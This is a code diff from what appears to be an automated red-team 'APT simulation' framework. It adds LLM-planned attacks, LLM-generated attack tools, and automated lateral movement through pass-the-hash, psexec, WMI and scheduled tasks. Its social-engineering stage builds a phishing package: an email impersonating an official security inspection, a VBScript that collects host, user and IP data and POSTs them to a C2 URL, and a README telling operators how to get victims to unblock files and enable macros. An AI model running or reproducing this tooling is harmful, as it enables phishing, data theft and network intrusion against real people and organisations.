+   在 plan 中标记 need_new_tool=true，并在 new_tool_spec 中描述需要动态生成的工具
+4. **输出 JSON 格式的攻击方案**
+
+## 输出格式
+```json
+{
+  "plan_id": "自动生成",
+  "target_signature": "基于端口+服务的hash",
+  "rationale": "为什么选择这个攻击路径的简要分析",
+  "need_new_tool": false,
+  "new_tool_spec": null,
+  "steps": [
+    {
+      "order": 1,
+      "tool": "工具名",
+      "params": {"target": "...", "port": 80},
+      "on_failure": "continue|abort|fallback",
+      "fallback_tool": "降级工具名",
+      "rationale": "为什么执行这一步"
+    }
+  ]
+}
+```"""
+
+
+def plan_attack(
+    state: AptSimulationState,
+    target_features: dict[str, Any],
+    assistant_factory: Callable[[str, list[str]], Any] | None = None,
+) -> dict[str, Any]:
+    """LLM 驱动的攻击方案规划 — 分析目标特征 → 输出最优攻击方案。
+
+    LLM 不可用时回退到基于端口映射的硬编码规则。
+    target_features 包含:
+      - open_ports: [{port, service, version}]
+      - categories: {http: [80], ssh: [22], ...}
+      - web_info: {auth_type, server, technologies}
+      - cve_findings: [...]
+      - http_results 摘要
+    """
+    import hashlib
+    import json as _json
+    import concurrent.futures as _cf
+
+    host = state.targets[0].host
+    open_ports = target_features.get("open_ports", [])
+
+    # ── 尝试 LLM 方案规划（带超时回退）──
+    try:
+        # 构建 LLM prompt
+        prompt = _json.dumps({
+            "target": host,
+            "open_ports": [
+                {"port": p.get("port", "?"), "service": p.get("service", "?"),
+                 "version": str(p.get("version", ""))[:60]}
+                for p in open_ports[:15]
+            ],
+            "categories": {k: list(v)[:5] for k, v in target_features.get("categories", {}).items()},
+            "cve_findings": [
+                {"cve_id": c.get("cve_id", ""), "severity": c.get("severity", ""),
+                 "service": str(c.get("service", ""))[:60]}
+                for c in target_features.get("cve_findings", [])[:5]
+            ],
+            "http_summary": _json.dumps(
+                {k: str(v)[:200] for k, v in target_features.get("http_results", {}).items()}
+            )[:500] if target_features.get("http_results") else "",
+            "available_tools": [
+                "web_content_fetch", "web_user_agent_brute", "web_codename_brute",
+                "web_login_brute", "dir_enum", "apt_web_poc",
+                "apt_credential_attack", "apt_smb_enum", "apt_redis_exploit",
+                "apt_docker_exploit", "apt_cve_verify", "hash_extract", "hash_crack",
+            ],
+        }, ensure_ascii=False, indent=2)
+
+        user_msg = (
+            f"请分析以下目标特征，生成最优攻击方案：\n\n```json\n{prompt}\n```\n\n"
+            "要求：先分析目标暴露的攻击面，再按优先级排列攻击步骤。"
+            "如果预置工具无法覆盖某种服务协议（如modbus/IoT/私有协议），"
+            "设置 need_new_tool=true 并在 new_tool_spec 描述。"
+        )
+
+        _executor = _cf.ThreadPoolExecutor(max_workers=1)
+        _future = _executor.submit(_llm_plan_attack, user_msg, assistant_factory)
+        try:
+            llm_plan = _future.result(timeout=60)
+            if llm_plan and llm_plan.get("steps"):
+                safe_print(f"  [plan] LLM 方案规划完成 — {len(llm_plan['steps'])} 步骤")
+                llm_plan["plan_id"] = hashlib.md5(
+                    f"{host}:{_json.dumps(open_ports, default=str)}".encode()
+                ).hexdigest()[:12]
+                llm_plan["target_signature"] = hashlib.sha256(
+                    _json.dumps(open_ports, sort_keys=True, default=str).encode()
+                ).hexdigest()[:16]
+
+                # ── 如果需要新工具，尝试 LLM 生成 ──
+                if llm_plan.get("need_new_tool") and llm_plan.get("new_tool_spec"):
+                    _gen_result = _generate_tool_from_plan(llm_plan, state, host)
+                    llm_plan["generated_tools"] = _gen_result
+
+                return llm_plan
+        except _cf.TimeoutError:
+            safe_print("  [plan] LLM 规划超时 (60s)，回退到端口映射")
+        finally:
+            _executor.shutdown(wait=False)
+    except Exception as exc:
+        safe_print(f"  [plan] LLM 规划失败: {str(exc)[:80]}，回退到端口映射")
+
+    # ── 回退: 基于端口映射的硬编码规则 ──
+    return _plan_attack_fallback(host, target_features)
+
+
+def _llm_plan_attack(
+    user_msg: str,
+    assistant_factory: Callable[[str, list[str]], Any] | None,
+) -> dict[str, Any] | None:
+    """调用 LLM 生成攻击方案"""
+    from .agentic import _collect_final_assistant_text, _extract_json_payload
+
+    if assistant_factory:
+        assistant = assistant_factory(PLAN_ATTACK_SYSTEM_PROMPT, [])
+    else:
+        llm_cfg = build_qwen_llm_config(model=DEEPSEEK_FLASH_MODEL, mode="apt")
+        assistant = create_qwen_security_assistant(
+            system_message=PLAN_ATTACK_SYSTEM_PROMPT, mode="apt",
+            function_list=[], llm_cfg=llm_cfg,
+        )
+
+    responses = assistant.run_nonstream([{"role": "user", "content": user_msg}])
+    final_text = _collect_final_assistant_text(responses)
+    if not final_text.strip():
+        return None
+    try:
+        return _extract_json_payload(final_text)
+    except Exception:
+        return None
+
+
+def _generate_tool_from_plan(
+    llm_plan: dict[str, Any],
+    state: AptSimulationState,
+    host: str,
+) -> dict[str, Any]:
+    """如果 LLM 方案需要新工具，调用 LLM 生成工具代码并缓存"""
+    from .apt_tools import tool_signature, lookup_tool_cache, store_tool_cache
+    import concurrent.futures as _cf
+
+    spec = llm_plan.get("new_tool_spec", {})
+    if isinstance(spec, dict):
+        tool_name = spec.get("tool_name", "dynamic_tool")
+        tool_desc = spec.get("description", "动态生成工具")
+        target_service = spec.get("target_service", "unknown")
+        target_version = spec.get("target_version", "")
+    elif isinstance(spec, str):
+        tool_name = "dynamic_tool"
+        tool_desc = spec
+        target_service = "unknown"
+        target_version = ""
+    else:
+        return {"error": "new_tool_spec 格式无效"}
+
+    sig = tool_signature(tool_name, host, target_service, target_version)
+    cached = lookup_tool_cache(sig)
+    if cached:
+        safe_print(f"  [gen-tool] 缓存命中: {sig}")
+        return {"cached": True, "signature": sig, "tool_code": cached["tool_code"]}
+
+    safe_print(f"  [gen-tool] LLM 生成新工具: {tool_name} → {target_service}")
+
+    gen_prompt = (
+        f"你需要生成一个 Python 函数来实现以下安全测试工具。\n\n"
+        f"工具名: {tool_name}\n"
+        f"用途: {tool_desc}\n"
+        f"目标服务: {target_service} (版本: {target_version})\n"
+        f"目标主机: {host}\n\n"
+        f"要求:\n"
+        f"1. 函数签名: def {tool_name}(target, port, **kwargs) -> dict\n"
+        f"2. 返回格式: {{success: bool, output: str, findings: [...]}}\n"
+        f"3. 代码必须无害 — 只探测不破坏\n"
+        f"4. 模拟执行: 环境不支持时返回 simulated=true\n"
+        f"5. 只输出 Python 代码，不要解释\n"
+    )
+
+    try:
+        _executor = _cf.ThreadPoolExecutor(max_workers=1)
+        llm_cfg = build_qwen_llm_config(model=DEEPSEEK_FLASH_MODEL, mode="apt")
+        assistant = create_qwen_security_assistant(
+            system_message="你是一个安全工具开发专家。只输出Python代码，不要解释。",
+            mode="apt", function_list=[], llm_cfg=llm_cfg,
+        )
+        _future = _executor.submit(
+            assistant.run_nonstream, [{"role": "user", "content": gen_prompt}]
+        )
+        try:
+            responses = _future.result(timeout=45)
+            from .agentic import _collect_final_assistant_text
+            final_text = _collect_final_assistant_text(responses)
+            tool_code = final_text.strip()
+            # 提取代码块（如果LLM包在```里）
+            import re as _re
+            _m = _re.search(r'```(?:python)?\s*([\s\S]*?)```', tool_code)
+            if _m:
+                tool_code = _m.group(1).strip()
+            if tool_code:
+                store_tool_cache(sig, tool_code, {"target": host, "service": target_service})
+                safe_print(f"  [gen-tool] 已缓存: {sig} ({len(tool_code)} 字符)")
+                return {"cached": False, "signature": sig, "tool_code": tool_code[:2000]}
+        except _cf.TimeoutError:
+            return {"error": "LLM 生成超时"}
+        finally:
+            _executor.shutdown(wait=False)
+    except Exception as exc:
+        return {"error": str(exc)[:200]}
+
+
+def _plan_attack_fallback(host: str, target_features: dict[str, Any]) -> dict[str, Any]:
+    """硬编码端口映射回退方案"""
+    import hashlib
+    import json as _json
+
+    open_ports = target_features.get("open_ports", [])
+    plan: dict[str, Any] = {
+        "plan_id": hashlib.md5(f"{host}:{_json.dumps(open_ports, default=str)}".encode()).hexdigest()[:12],
+        "target": host, "target_signature": "", "phases": {},
+        "rationale": "", "fallback": True,
+    }
+    steps: list[dict[str, Any]] = []
+    svc_set = set()
+
+    for port_info in open_ports:
+        port = port_info.get("port", 0)
+        svc = port_info.get("service", "unknown")
+        svc_key = f"{svc}:{port}"
+        if svc_key in svc_set:
+            continue
+        svc_set.add(svc_key)
+
+        if svc in ("http", "https", "http-alt", "http-proxy", "https-alt"):
+            for _t, _p in [
+                ("web_content_fetch", {"port": port, "path": "/", "timeout": 3}),
+                ("web_user_agent_brute", {"port": port, "timeout": 2}),
+                ("web_codename_brute", {"port": port, "timeout": 2}),
+            ]:
+                steps.append({"order": len(steps) + 1, "tool": _t, "params": {**{"target": host}, **_p},
+                              "on_failure": "continue", "rationale": f"端口{port} HTTP探测"})
+        elif svc == "ssh":
+            steps.append({"order": len(steps) + 1, "tool": "apt_credential_attack",
+                          "params": {"host": host, "services": [{"port": port, "service": "ssh"}],
+                                     "max_threads": 3, "timeout": 10},
+                          "on_failure": "continue", "rationale": f"SSH弱口令(端口{port})"})
+        elif svc in ("smb", "microsoft-ds", "netbios-ssn"):
+            steps.append({"order": len(steps) + 1, "tool": "apt_smb_enum",
+                          "params": {"host": host}, "on_failure": "continue",
+                          "rationale": f"SMB枚举(端口{port})"})
+        elif svc == "redis":
+            steps.append({"order": len(steps) + 1, "tool": "apt_redis_exploit",
+                          "params": {"target": host, "port": port}, "on_failure": "continue",
+                          "rationale": f"Redis利用(端口{port})"})
+        elif svc == "docker":
+            steps.append({"order": len(steps) + 1, "tool": "apt_docker_exploit",
+                          "params": {"target": host, "port": port}, "on_failure": "continue",
+                          "rationale": f"Docker利用(端口{port})"})
+        elif svc in ("ftp", "telnet"):
+            steps.append({"order": len(steps) + 1, "tool": "apt_credential_attack",
+                          "params": {"host": host, "services": [{"port": port, "service": svc}],
+                                     "users": ["anonymous", "admin", "root"],
+                                     "passwords": ["", "anonymous"], "max_threads": 2},
+                          "on_failure": "continue", "rationale": f"{svc.upper()}弱口令(端口{port})"})
+
+    cve_findings = target_features.get("cve_findings", [])
+    for cve in cve_findings[:3]:
+        cve_id = cve.get("cve_id", "")
+        if cve_id:
+            steps.append({"order": len(steps) + 1, "tool": "apt_cve_verify",
+                          "params": {"target": host, "cve_id": cve_id},
+                          "on_failure": "continue", "rationale": f"验证{cve_id}"})
+
+    if not steps:
+        plan["rationale"] = "无特殊攻击面"
+        steps = [{"order": 1, "tool": "scan_complete", "params": {}, "rationale": "无特殊攻击面"}]
+
+    plan["phases"]["initial_access"] = steps
+    plan["rationale"] = f"回退方案: 目标 {host} 开放 {len(open_ports)} 端口 → {len(steps)} 步骤"
+    plan["target_signature"] = hashlib.sha256(
+        _json.dumps(open_ports, sort_keys=True, default=str).encode()
+    ).hexdigest()[:16]
+    return plan
+
+
+# ── 改进2: 多技术横向移动 ──────────────────────────────
+
+def _auto_cross_target_multi_tech(
+    state: AptSimulationState,
+    creds: dict[str, Any],
+    cross_host: str,
+) -> dict[str, Any]:
+    """多技术横向移动 — 基于权限类型自动选择最优技术，支持自动降级。
+
+    技术优先级链:
+      SSH凭证(Linux): port_forward → ssh_key_reuse → schtasks(cron)
+      SSH凭证(Win):   remote_exec → internal_scan
+      域用户+NTLM:    pass_the_hash → psexec → wmi_exec
+      本地管理员:     psexec → wmi_exec → schtasks
+    """
+    safe_print("  [cross-target/multi] 多技术横向移动...")
+
+    u = creds.get("username", "")
+    p = creds.get("password", "")
+    nt_hash = state.notes.get("ntlm_hash", "")
+    access_level = state.notes.get("post_exploit", {}).get("access_level", "user")
+    harvested_hosts = state.notes.get("post_exploit", {}).get("harvested", {}).get("hosts", [])
+
+    results: dict[str, Any] = {
+        "methods_tried": [],
+        "methods_succeeded": [],
+        "methods_failed": [],
+        "findings": [],
+        "compromised": False,
+    }
+
+    # 推断子网 (从已控主机 IP 推测)
+    import ipaddress as _ip
+    jump_host = state.targets[0].host
+    _subnet = ""
+    try:
+        _jip = _ip.ip_address(jump_host)
+        if _jip.version == 4:
+            # 推断 /24 子网
+            _octets = str(_jip).split(".")
+            _subnet = f"{_octets[0]}.{_octets[1]}.{_octets[2]}.0/24"
+    except ValueError:
+        pass
+
+    if cross_host:
+        target_host = cross_host
+    elif harvested_hosts:
+        target_host = harvested_hosts[0]
+    else:
+        target_host = ""
+
+    # ── 步骤1: 内网资产发现 ──
+    if _subnet and not target_host:
+        safe_print(f"  [cross-target] 内网扫描 {_subnet}...")
+        try:
+            scan_r = run_local_tool("apt_internal_scan", {
+                "host": jump_host, "username": u, "password": p,
+                "subnet": _subnet, "ports": "22,80,443,445,3389,8080",
+            })
+            results["internal_scan"] = scan_r
+            discovered = scan_r.get("discovered_hosts", [])
+            if discovered:
+                results["findings"].append(f"内网发现 {len(discovered)} 个存活主机")
+                # 选第一个非跳板主机作为目标
+                for h in discovered:
+                    hip = h.get("ip", "")
+                    if hip and hip != jump_host:
+                        target_host = hip
+                        break
+        except Exception as exc:
+            results["methods_failed"].append({"technique": "internal_scan", "reason": str(exc)[:100]})
+
+    if not target_host:
+        results["findings"].append("未发现内网目标，无法横向移动")
+        return results
+
+    safe_print(f"  [cross-target] 目标内网主机: {target_host}")
+
+    # ── 步骤2: 多技术横向移动 ──
+    is_admin = access_level in ("root", "admin", "administrator")
+    has_ntlm = bool(nt_hash)
+
+    # 技术优先级链
+    techniques: list[tuple[str, str, dict[str, Any]]] = []
+    if has_ntlm:
+        techniques.append(("pass_the_hash", "apt_pass_the_hash", {
+            "host": jump_host, "nt_hash": nt_hash, "target_host": target_host,
+            "command": "whoami; hostname", "username": "Administrator",
+        }))
+    if is_admin or has_ntlm:
+        techniques.append(("psexec", "apt_psexec", {
+            "host": jump_host, "username": u, "password": p,
+            "target_host": target_host, "command": "whoami",
+        }))
+        techniques.append(("wmi", "apt_wmi_exec", {
+            "host": jump_host, "username": u, "password": p,
+            "target_host": target_host, "command": "cmd /c whoami",
+        }))
+    techniques.append(("schtasks", "apt_schtasks", {
+        "host": jump_host, "username": u, "password": p,
+        "target_host": target_host, "command": "cmd /c whoami > C:\\temp\\p.log",
+    }))
+    techniques.append(("ssh_key_reuse", "apt_ssh_key_reuse", {
+        "host": jump_host, "username": u, "password": p,
+        "target_host": target_host, "target_user": u,
+    }))
+    # 总是尝试端口转发
+    techniques.insert(0, ("port_forward", "apt_port_forward", {
+        "host": jump_host, "username": u, "password": p,
+        "remote_host": target_host, "remote_port": 22,
+    }))
+
+    for tech_name, tool_name, params in techniques:
+        safe_print(f"  [cross-target] 尝试 {tech_name} → {target_host}...")
+        results["methods_tried"].append(tech_name)
+        try:
+            r = run_local_tool(tool_name, params)
+            if r.get("success"):
+                results["methods_succeeded"].append(tech_name)
+                results[f"{tech_name}_result"] = r
+                results["findings"].append(f"{tech_name} 成功: {target_host}")
+                results["compromised"] = True
+                # 成功后停止尝试
+                if r.get("simulated"):
+                    results["findings"].append(f"注意: {tech_name} 为模拟执行")
+                break
+            else:
+                err = r.get("error", r.get("output", "未知错误"))[:100]
+                results["methods_failed"].append({"technique": tech_name, "reason": err})
+                results["findings"].append(f"{tech_name} 失败: {err}")
+        except Exception as exc:
+            results["methods_failed"].append({"technique": tech_name, "reason": str(exc)[:100]})
+            results["findings"].append(f"{tech_name} 异常: {str(exc)[:80]}")
+
+    # ── 保存失败记录到 state.notes ──
+    state.notes["lateral_movement"] = {
+        "methods_tried": results["methods_tried"],
+        "methods_succeeded": results["methods_succeeded"],
+        "methods_failed": results["methods_failed"],
+        "target_host": target_host,
+    }
+
+    return results
+
+
+def _auto_execute_social_eng(state: AptSimulationState, host: str) -> dict[str, Any]:
+    """自动执行社工钓鱼阶段 — 生成钓鱼邮件 + 宏附件 + C2 配置"""
+    import os as _os
+    safe_print("  [自动执行] 社工钓鱼阶段 — 生成钓鱼邮件 + 宏附件")
+
+    results: dict[str, Any] = {
+        "findings": [],
+        "phishing_result": {},
+        "conversation_result": {},
+        "macro_result": {},
+    }
+
+    # ── 生成钓鱼邮件 ──
+    try:
+        _phish = run_local_tool("se_phishing_gen", {
+            "context": {
+                "target": host,
+                "organization": host,
+                "phase_results": [
+                    {"phase": r.phase.value, "status": r.status, "summary": r.summary, "findings": r.findings}
+                    for r in state.phase_results.values()
+                ],
+                "compromised": state.targets[0].compromised if state.targets else False,
+                "blue_team_awareness": state.blue_team_awareness,
+            }
+        })
+        results["phishing_result"] = _phish
+        results["findings"].extend(_phish.get("findings", [])[:5])
+    except Exception as exc:
+        results["phishing_result"] = {"error": str(exc)[:200]}
+
+    # ── 生成社工话术 ──
+    try:
+        _conv = run_local_tool("se_conversation_gen", {
+            "context": {
+                "target": host,
+                "organization": host,
+                "phase_results": [
+                    {"phase": r.phase.value, "status": r.status, "summary": r.summary, "findings": r.findings}
+                    for r in state.phase_results.values()
+                ],
+            }
+        })
+        results["conversation_result"] = _conv
+        results["findings"].extend(_conv.get("findings", [])[:5])
+    except Exception as exc:
+        results["conversation_result"] = {"error": str(exc)[:200]}
+
+    # ── 生成宏附件 ──
+    c2_url = state.notes.get("c2_url", "http://127.0.0.1:8080/capture")
+    output_dir = _os.path.join("output", "phishing", host.replace(".", "_"))
+    _os.makedirs(output_dir, exist_ok=True)
+    _attachment_name = "phishing_attachment"
+    _output_path = _os.path.join(output_dir, _attachment_name)
+
+    try:
+        _macro = run_local_tool("generate_macro_doc", {
+            "target_name": host,
+            "c2_url": c2_url,
+            "output_path": _output_path,
+            "attachment_type": "xlsm",
+        })
+        results["macro_result"] = _macro
+        results["findings"].extend(_macro.get("findings", [])[:5])
+        if _macro.get("macro_code"):
+            results["macro_code"] = _macro["macro_code"][:2000]  # 截断
+
+        # 注入钓鱼邮件元数据
+        results["email_subject"] = f"关于{host}年度信息安全检查的紧急通知"
+        results["email_body"] = (
+            f"各单位：\n\n"
+            f"接上级通知，为配合2025年度信息安全专项检查工作，请各单位负责人立即下载附件，"
+            f"按要求填写相关信息并回传。此项工作纳入年度考核，请务必高度重视。\n\n"
+            f"附件：信息安全自查表.xlsm\n\n"
+            f"此致\n\n{host}信息中心"
+        )
+        results["attachment_name"] = f"{host}_security_check.xlsm"
+        results["c2_url"] = c2_url
+        results["attachment_path"] = _os.path.abspath(_macro.get("output_path", ""))
+        results["vba_path"] = _os.path.abspath(results["attachment_path"].replace(".xlsm", ".vba.txt")) if results["attachment_path"] else ""
+        # 将钓鱼邮件内容写入文件
+        results["email_path"] = _os.path.abspath(_os.path.join(output_dir, "phishing_email.txt"))
+        try:
+            with open(results["email_path"], "w", encoding="utf-8") as _ef:
+                _ef.write(f"主题: {results['email_subject']}\n")
+                _ef.write(f"发件人: info@{host}\n")
+                _ef.write(f"附件: {results['attachment_name']}\n")
+                _ef.write(f"{'='*60}\n\n")
+                _ef.write(results["email_body"])
+            safe_print(f"  [钓鱼邮件] 已保存到 {results['email_path']}")
+        except Exception as _we:
+            results["email_path"] = f"(写入失败: {_we})"
+
+        # ── 生成独立 .vbs 测试脚本（双击即可测试 C2，无需 Excel）──
+        # 注意：VBScript 不支持 UTF-8，中文 Windows 需写 GBK 或纯英文
+        _vbs_path = _os.path.abspath(_os.path.join(output_dir, "c2_test.vbs"))
+        try:
+            _vbs_code = (
+                f"' C2 Connectivity Test Script — double-click to run\r\n"
+                f"' Target C2: {c2_url}\r\n"
+                f"\r\n"
+                f"Dim hostname, username, osVer, internalIP, execProof, postData\r\n"
+                f"Dim objHTTP, objShell, objExec, output, ipRegex, ipMatch\r\n"
+                f"\r\n"
+                f"hostname = CreateObject(\"WScript.Network\").ComputerName\r\n"
+                f"username = CreateObject(\"WScript.Network\").UserName\r\n"
+                f"Set objShell = CreateObject(\"WScript.Shell\")\r\n"
+                f"osVer = objShell.ExpandEnvironmentStrings(\"%OS%\")\r\n"
+                f"internalIP = \"unknown\"\r\n"
+                f"\r\n"
+                f"' Get internal IP (works on both EN and CN Windows)\r\n"
+                f"Set objExec = objShell.Exec(\"ipconfig\")\r\n"
+                f"output = objExec.StdOut.ReadAll()\r\n"
+                f"Set ipRegex = CreateObject(\"VBScript.RegExp\")\r\n"
+                f"ipRegex.Pattern = \"IPv4[^\\d]*(\\d+\\.\\d+\\.\\d+\\.\\d+)\"\r\n"
+                f"Set ipMatch = ipRegex.Execute(output)\r\n"
+                f"If ipMatch.Count > 0 Then internalIP = ipMatch(0).SubMatches(0)\r\n"
+                f"\r\n"
+                f"' Harmless execution proof\r\n"
+                f"execProof = \"RedTeam proof: \" & hostname & \"/\" & username\r\n"
+                f"objShell.Run \"cmd /c echo \" & execProof & \" > %TEMP%\\\\redteam_proof.txt\", 0, True\r\n"
+                f"\r\n"
+                f"' HTTP POST callback — MSXML2 / WinHTTP / XMLHTTP fallback\r\n"
+                f"On Error Resume Next\r\n"
+                f"Set objHTTP = CreateObject(\"MSXML2.ServerXMLHTTP\")\r\n"
+                f"If Err.Number <> 0 Then\r\n"
+                f"    Err.Clear\r\n"
+                f"    Set objHTTP = CreateObject(\"WinHttp.WinHttpRequest.5.1\")\r\n"
+                f"End If\r\n"
+                f"If Err.Number <> 0 Then\r\n"
+                f"    Err.Clear\r\n"
+                f"    Set objHTTP = CreateObject(\"MSXML2.XMLHTTP\")\r\n"
+                f"End If\r\n"
+                f"On Error GoTo 0\r\n"
+                f"\r\n"
+                f"If Not objHTTP Is Nothing Then\r\n"
+                f"    postData = \"hostname=\" & hostname & \"&username=\" & username & _\r\n"
+                f"               \"&os=\" & osVer & \"&internal_ip=\" & internalIP & \"&proof=\" & execProof\r\n"
+                f"    objHTTP.Open \"POST\", \"{c2_url}\", False\r\n"
+                f"    objHTTP.setRequestHeader \"Content-Type\", \"application/x-www-form-urlencoded\"\r\n"
+                f"    objHTTP.send postData\r\n"
+                f"    MsgBox \"C2 Callback Sent!\" & vbCrLf & vbCrLf & _\r\n"
+                f"           \"Hostname: \" & hostname & vbCrLf & _\r\n"
+                f"           \"Username: \" & username & vbCrLf & _\r\n"
+                f"           \"Internal IP: \" & internalIP & vbCrLf & _\r\n"
+                f"           \"HTTP Status: \" & objHTTP.Status, vbInformation, \"C2 Test OK\"\r\n"
+                f"Else\r\n"
+                f"    MsgBox \"Cannot create HTTP object.\" & vbCrLf & _\r\n"
+                f"           \"Host: \" & hostname & vbCrLf & \"User: \" & username & vbCrLf & \"IP: \" & internalIP, _\r\n"
+                f"           vbExclamation, \"C2 Test (no HTTP)\"\r\n"
+                f"End If\r\n"
+            )
+            with open(_vbs_path, "w", encoding="utf-8", newline="") as _vf:
+                _vf.write(_vbs_code)
+            safe_print(f"  [C2测试] .vbs 脚本已生成 → {_vbs_path}")
+        except Exception as _ve:
+            _vbs_path = f"(vbs生成失败: {_ve})"
+
+        # ── 生成 .bat 快速连通性测试 ──
+        _bat_path = _os.path.abspath(_os.path.join(output_dir, "c2_quick_test.bat"))
+        try:
+            _bat_code = f"""@echo off
+chcp 65001 >nul
+echo === C2 连通性快速测试 ===
+echo 目标: {c2_url}
+echo.
+echo [1/2] 检测 C2 是否可达...
+curl -s -o nul -w "%%{{http_code}}" --connect-timeout 5 {c2_url} >nul 2>&1
+if errorlevel 1 (
+    echo [失败] 无法连接到 C2 服务器，请检查网络和防火墙
+    goto :end
+)
+echo [通过] C2 服务器可达
+echo.
+echo [2/2] 发送测试 POST...
+curl -s -X POST "{c2_url}" -d "hostname=TEST_PC&username=test_user&os=Windows&internal_ip=127.0.0.1&proof=bat_test" --connect-timeout 5
+echo.
+echo [通过] 测试数据已发送，请检查 C2 监听器控制台
+:end
+pause
+"""
+            with open(_bat_path, "w", encoding="utf-8") as _bf:
+                _bf.write(_bat_code)
+            safe_print(f"  [C2测试] .bat 快速测试已生成 → {_bat_path}")
+        except Exception as _be:
+            _bat_path = f"(bat生成失败: {_be})"
+
+        # ── 打包为投递 zip ──
+        _zip_name = "phishing_package.zip"
+        _zip_path = _os.path.join(output_dir, _zip_name)
+        try:
+            import zipfile as _zf
+            _xlsm = _macro.get("output_path", "")
+            _vba = _xlsm.replace(".xlsm", ".vba.txt") if _xlsm else ""
+            _att_name = results.get("attachment_name", "attachment.xlsm")
+            with _zf.ZipFile(_zip_path, "w", _zf.ZIP_DEFLATED) as _z:
+                _readme = (
+                    "=== APT 钓鱼投递包 ===\n\n"
+                    f"目标: {host}\n"
+                    f"C2 回调地址: {c2_url}\n\n"
+                    "── 文件说明 ──\n"
+                    f"  {_att_name}          → 恶意宏文档 (发送给目标)\n"
+                    f"  c2_test.vbs           → C2 测试脚本 (本机双击验证)\n"
+                    f"  c2_quick_test.bat     → C2 连通性测试 (命令行)\n"
+                    f"  phishing_email.txt    → 邮件模板 (参考撰写)\n"
+                    f"  macro_code.vba.txt    → 宏代码明文 (审查/修改)\n\n"
+                    "── 本机测试步骤（投递前必做）──\n"
+                    "1. 启动 C2 监听器: python -m security_log_analyzer.c2_listener --port 8080\n"
+                    "2. 双击 c2_test.vbs → 应弹出「C2 回传完成」对话框\n"
+                    "3. 检查 C2 控制台是否有新捕获记录\n\n"
+                    "── 投递步骤 ──\n"
+                    "1. 仿冒 IT/HR/领导身份，用 phishing_email.txt 作为模板写邮件\n"
+                    "2. 将 .xlsm 作为附件发送 (Gmail / 企业邮箱 / 内网共享)\n"
+                    "3. 目标收到后：右键 .xlsm → 属性 → 勾选「解除锁定」→ 确定\n"
+                    "4. 目标打开文件 → 如弹出 Protected View 黄条 → 点击「启用编辑」\n"
+                    "5. 如弹出宏安全警告 → 点击「启用内容」\n"
+                    "6. 宏执行后弹出确认框 → C2 监听器收到回调\n\n"
+                    "── Excel 宏安全设置（如无「启用内容」按钮）──\n"
+                    "文件 → 选项 → 信任中心 → 信任中心设置 → 宏设置\n"
+                    "→ 选择「禁用所有宏，并发出通知」(第二项) → 确定\n"
+                    "→ 关闭 Excel 重新打开 .xlsm 即可看到黄条提示\n\n"
+                    "── 注意 ──\n"
+                    "  Windows 对下载文件自动添加「Mark of the Web」标记\n"
+                    "  必须右键文件 → 属性 → 解除锁定，否则宏会被静默禁用\n"
+                    "  C2 监听器必须在目标网络可达 (公网 IP 或同局域网)\n"
+                )
+                _z.writestr("README.txt", _readme)
+                if _os.path.exists(results["email_path"]):
+                    _z.write(results["email_path"], "phishing_email.txt")
+                if _xlsm and _os.path.exists(_xlsm):
+                    _z.write(_xlsm, _att_name)
+                if _vba and _os.path.exists(_vba):
+                    _z.write(_vba, "macro_code.vba.txt")
+                if _os.path.exists(_vbs_path):
+                    _z.write(_vbs_path, "c2_test.vbs")
+                if _os.path.exists(_bat_path):
+                    _z.write(_bat_path, "c2_quick_test.bat")
+            results["zip_path"] = _os.path.abspath(_zip_path)
+            safe_print(f"  [钓鱼打包] 投递包已生成 → {results['zip_path']}")
+        except Exception as _ze:
+            results["zip_path"] = f"(打包失败: {_ze})"
+            safe_print(f"  [钓鱼打包] 失败: {_ze}")
+    except Exception as exc:
+        results["macro_result"] = {"error": str(exc)[:200]}
+
+    return results
+
+
 def _auto_execute_phase_tools(phase: AptPhase, state: AptSimulationState) -> dict[str, Any]:
     """全自动执行当前阶段所有工具，LLM 仅做结果分析，不参与工具循环"""
     safe_print(f"  [自动执行] {PHASE_LABELS.get(phase, phase.value)} 阶段全部工具")
@@ -1617,11 +2606,31 @@ def _auto_execute_phase_tools(phase: AptPhase, state: AptSimulationState) -> dic
     creds = state.notes.get("credentials", {})
     has_creds = bool(creds and creds.get("username") and creds.get("password"))
 
-    # ── RECON / INITIAL_ACCESS 已有专用函数 ──
+    # ── RECON / INITIAL_ACCESS / CROSS_TARGET 已有专用函数 ──
     if phase == AptPhase.RECON:
         return _auto_recon(host)
     if phase == AptPhase.INITIAL_ACCESS:
         return _auto_initial_access(host, state)
+    if phase == AptPhase.CROSS_TARGET and has_creds:
+        cross_host = state.targets[1].host if len(state.targets) > 1 else ""
+        if not cross_host:
+            cross_host = state.notes.get("cross_target", "")
+        cross_results = _auto_cross_target_multi_tech(state, creds, cross_host)
+        # 注入攻防方案生成结果
+        try:
+            cross_plan = run_local_tool("apt_cross_plan", {"state": {
+                "target": host, "via_target": host,
+                "cross_target": cross_host or "内网主机",
+                "available_methods": cross_results.get("methods_tried", []),
+            }})
+            cross_results["cross_plan"] = cross_plan
+        except Exception:
+            pass
+        return cross_results
+    if phase == AptPhase.SOCIAL_ENG:
+        # 社工钓鱼 — 生成宏附件
+        _social_results = _auto_execute_social_eng(state, host)
+        return _social_results
 
     results: dict[str, Any] = {}
     tool_list = PHASE_TOOLS[phase]
@@ -1656,15 +2665,26 @@ def _auto_execute_phase_tools(phase: AptPhase, state: AptSimulationState) -> dic
         "se_conversation_gen": ("context", {
             "target": host, "organization": "", "phase_results": state_snapshot["phase_results"],
         }),
+        "generate_macro_doc": ("state", {
+            "target_name": host, "c2_url": state.notes.get("c2_url", "http://127.0.0.1:8080/capture"),
+            "output_path": f"./{host.replace('.', '_')}_attachment",
+            "attachment_type": "xlsm",
+        }),
         # PERSISTENCE
         "apt_persistence_plan": ("target_info", state_snapshot),
         "apt_log_clean": ("target_info", state_snapshot),
         # LATERAL (无 credential_attack 防止 SSH 爆破)
         "apt_lateral_plan": ("state", state_snapshot),
         "apt_privilege_plan": ("state", state_snapshot),
-        # CROSS_TARGET
+        # CROSS_TARGET (多技术横向移动)
         "apt_cross_plan": ("state", state_snapshot),
         "apt_evasion_plan": ("state", state_snapshot),
+        "apt_psexec": ("state", state_snapshot),
+        "apt_wmi_exec": ("state", state_snapshot),
+        "apt_schtasks": ("state", state_snapshot),
+        "apt_pass_the_hash": ("state", state_snapshot),
+        "apt_ssh_key_reuse": ("state", state_snapshot),
+        "apt_internal_scan": ("state", state_snapshot),
         # REPORT
         "apt_report_gen": ("state", state_snapshot),
     }
@@ -1687,8 +2707,18 @@ def _auto_execute_phase_tools(phase: AptPhase, state: AptSimulationState) -> dic
             # Auto-populate reconnaissance command for apt_remote_exec
             if tool_name == "apt_remote_exec":
